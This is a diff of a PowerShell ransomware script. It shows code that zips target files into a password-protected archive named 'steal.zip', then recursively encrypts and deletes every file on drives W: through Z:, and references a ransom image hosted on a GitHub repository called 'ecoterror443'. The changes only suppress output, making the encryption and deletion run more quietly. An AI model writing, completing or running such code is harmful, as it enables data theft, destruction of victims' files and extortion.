@@ -153,7 +153,7 @@ For($i = 1; $i -le $files.count; $i++)
 
 { Write-Progress -Activity "“Collecting files” -status “Finding file $i”" -percentComplete ($i / $files.count*100)}
 
-$files | Select name
+# $files | Select name
 Write-Host "[+] Target files copied to temp location..." -ForegroundColor Green
 Compress-7Zip -Path $Destination -ArchiveFileName c:\temp\steal.zip -Format Zip -Password "$pwd1" | Out-Null 
 
@@ -272,25 +272,25 @@ Function Encr{param([string]$i,[string]$p)
 foreach ($i in $(Get-ChildItem W:\ -recurse -include *.*  | ForEach-Object { $_.FullName })){ 
   Encr -i $i -p $pwd2
   Write-Host " -> Encrypting target file: $i"
-  rm $i
+  rm $i | Out-Null
 }
 
 foreach ($i in $(Get-ChildItem X:\ -recurse -include *.*  | ForEach-Object { $_.FullName })){ 
   Encr -i $i -p $pwd2
   Write-Host " -> Encrypting target file: $i"
-  rm $i
+  rm $i | Out-Null
 }
 
 foreach ($i in $(Get-ChildItem Y:\ -recurse -include *.*  | ForEach-Object { $_.FullName })){ 
   Encr -i $i -p $pwd2
   Write-Host " -> Encrypting target file: $i"
-  rm $i
+  rm $i | Out-Null
 }
 
 foreach ($i in $(Get-ChildItem Z:\ -recurse -include *.*  | ForEach-Object { $_.FullName })){ 
   Encr -i $i -p $pwd2
   Write-Host " -> Encrypting target file: $i"
-  rm $i
+  rm $i | Out-Null
 }
 
 $alert = "https://raw.githubusercontent.com/ecoterror443/filerepo/main/img.png"
